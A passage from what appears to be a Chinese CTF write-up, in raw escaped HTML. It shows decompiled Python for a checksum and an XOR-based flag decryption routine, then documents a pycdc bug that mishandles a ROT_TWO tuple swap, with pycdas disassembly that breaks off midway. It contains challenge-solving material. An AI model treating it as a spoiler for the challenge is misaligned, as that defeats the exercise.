                print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect checksum (z=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; tested against checksum[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z, k, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;checksum[k]))
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一个方法是逆向这一部分，然后运行程序，应该就能拿到flag&lt;/p&gt;
&lt;p&gt;但懒得配环境了，所以又找了一下flag生成函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ActivatedWidget&lt;/span&gt;(QWidget):
    __doc__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;docstring for ActivatedWidget&amp;#39;&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self):
        super(ActivatedWidget, self)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;lab_result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;yek &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
         &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;202&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;234&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;173&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;232&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;146&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;145&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;vei &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
         &lt;span style=&#34;color:#ae81ff&#34;&gt;175&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;161&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;218&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;173&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;202&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;184&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cne &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
         &lt;span style=&#34;color:#ae81ff&#34;&gt;253&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;187&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;252&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;196&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;138&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;165&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;142&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;237&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;154&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;189&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;195&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;205&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;230&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;180&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;134&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;143&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;250&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;235&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;231&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;149&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;252&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;223&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;119&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;206&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;218&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;225&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;253&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;156&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;146&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;188&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;184&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;178&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;167&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;231&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;132&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;253&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;224&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;171&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;194&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;181&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;247&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;137&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;139&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;251&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;169&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;198&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;246&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;197&lt;/span&gt;,
         &lt;span style=&#34;color:#ae81ff&#34;&gt;226&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;]
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;init_ui()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;finalize&lt;/span&gt;(self):
        clear &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cne
        key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;yek
        iv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;vei
        buf_sz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(buf)
        bsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, int(buf_sz &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; bsize)):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, bsize):
                c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf[(i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; bsize &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j)] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; key[j] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; iv[j]
                iv[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf[(i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; bsize &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j)]
                buf[i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; bsize &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; c

        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf[(buf_sz &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, i):
            buf[buf_sz &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, buf_sz):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; buf[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
            clear &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(buf[i])

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; clear
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;手动将这一段提取出来，然后修改一下，将 &lt;code&gt;return&lt;/code&gt; 改成 &lt;code&gt;print&lt;/code&gt; ，也能拿到flag&lt;/p&gt;
&lt;h2 id=&#34;简要记录pycdc的bug&#34;&gt;简要记录pycdc的bug&lt;/h2&gt;
&lt;h3 id=&#34;rot_two指令未成功还原&#34;&gt;ROT_TWO指令未成功还原&lt;/h3&gt;
&lt;p&gt;好像是蓝帽杯决赛的时候遇到的问题吧？当时用pycdas手动解的，后来修改了一下pyc文件前几个字节的混淆，用pycdc跑完后发现的问题（可能是混淆没去干净，只还原出了前三个函数，不过正好发现了这个bug）&lt;/p&gt;
&lt;p&gt;手动还原的为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gen_prime&lt;/span&gt;(n_bits):
    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gen_num(n_bits)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; g&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;is_prime(res):
        b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            res, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b, (res &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后用pycdc还原的为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gen_prime&lt;/span&gt;(n_bits):
    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gen_num(n_bits)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; g&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;is_prime(res):
        b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b
            b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (res &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;附上pycdas结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;        [Code]
            File Name: &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;somewhere&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;encrypt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
            Object Name: gen_prime
            Arg Count: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
            KW Only Arg Count: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
            Locals: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
            Stack Size: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
            Flags: &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000043&lt;/span&gt; (CO_OPTIMIZED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CO_NEWLOCALS &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CO_NOFREE)
            [Names]
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gen_num&amp;#39;&lt;/span&gt;
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_prime&amp;#39;&lt;/span&gt;
            [Var Names]
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;n_bits&amp;#39;&lt;/span&gt;
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;res&amp;#39;&lt;/span&gt;
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;
            [Free Vars]
            [Cell Vars]
            [Constants]
                &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
            [Disassembly]
                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: gen_num
                &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;       LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: n_bits
                &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;       STORE_FAST              &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: res
                &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;       SETUP_LOOP              &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; (to &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)
                &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;      LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: g
                &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;      LOAD_METHOD             &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: is_prime
                &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: res
                &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;      CALL_METHOD             &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;      POP_JUMP_IF_TRUE        &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;      STORE_FAST              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: b
                &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;      SETUP_LOOP              &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; (to &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;)
                &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: b
                &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;      COMPARE_OP              &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;)
                &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;      POP_JUMP_IF_FALSE       &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: res
                &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: b
                &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;      BINARY_XOR              
                &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: res
                &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: b
                &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;      BINARY_AND              
                &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
